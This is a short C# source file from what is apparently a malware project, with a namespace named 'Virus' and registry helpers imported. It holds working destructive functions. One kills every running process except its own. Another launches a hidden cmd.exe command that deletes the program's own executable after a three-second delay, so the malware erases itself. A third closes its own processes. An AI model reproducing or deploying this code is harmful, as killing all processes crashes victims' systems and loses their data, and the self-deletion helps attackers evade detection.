using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Virus.RegHelpers;

namespace Virus
{
    class MyFuncs
    {
        
        public static void KillAllProcesses()
        {
            Process self = Process.GetCurrentProcess();
            foreach (Process p in Process.GetProcesses().Where(p => p.ProcessName != self.ProcessName))
            {
                p.Kill();
            }
        }
        public static void DeleteYourself()
        {
            //Launch Suicide Mission with 3 second timer
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Normal,
                CreateNoWindow = false,
                FileName = "cmd.exe"
            });
            
        }
        public static void CloseApp()
        {
            Process[] _process = null;
            var x = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
            _process = Process.GetProcessesByName(x);
            foreach (Process p in _process)
            {
                p.Kill();
            }
        }
        
    }
}
